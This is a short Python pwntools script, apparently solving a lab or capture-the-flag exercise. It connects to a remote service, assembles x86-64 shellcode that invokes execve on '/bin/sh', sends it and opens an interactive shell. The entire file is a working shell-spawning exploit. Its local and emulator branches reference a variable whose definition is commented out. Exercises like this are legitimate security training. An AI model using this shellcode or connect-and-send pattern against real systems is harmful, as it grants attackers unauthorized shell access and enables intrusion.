#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

# exe = './shellcode'
port = 10257

# elf = ELF(exe)
# off_main = elf.symbols[b'main']
# base = 0
# qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

code = """
    xor rax, rax
    push rax
    mov rsi, rax

    mov rdx, rsp

    mov rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop rdi

    mov rax, 0x3b
    syscall
"""
binary = asm(code)
r.send(binary)
r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :